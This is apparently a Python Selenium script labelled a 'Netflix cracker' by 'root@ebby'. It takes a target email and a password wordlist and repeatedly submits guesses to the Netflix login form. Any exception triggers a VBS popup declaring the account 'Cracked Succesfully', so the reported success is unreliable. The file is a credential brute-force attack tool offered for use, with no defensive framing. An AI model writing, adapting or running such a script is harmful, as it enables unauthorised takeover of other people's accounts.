from selenium import webdriver
import os
import time

usr_mail = input("Mail : ")
wlist = input("Wordlist : ")
url = "https://www.netflix.com/tr/login"

browser = webdriver.Firefox()

browser.get(url)
time.sleep(2)

usr_mail_path = browser.find_element_by_xpath('//*[@id="id_userLoginId"]')
usr_passwd_path = browser.find_element_by_xpath('//*[@id="id_password"]')
click_me = browser.find_element_by_xpath('//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
try:
    
    with open(wlist,"r",encoding="UTF-8") as password_file:
        for password in password_file:
        
            usr_mail_path.clear()
            usr_passwd_path.clear()
            usr_mail_path.send_keys(usr_mail)
            usr_passwd_path.send_keys(password)
            click_me.click()
            time.sleep(1)
        
except:
            
    os.system('(echo MsgBox "Netflix Cracked Succesfully" ^& vbCrLf ^& "coded by root@ebby:~#",262192, "NETFLİX CRACKER")> File.vbs')

    os.system('start File.vbs')

            

        



"""

"""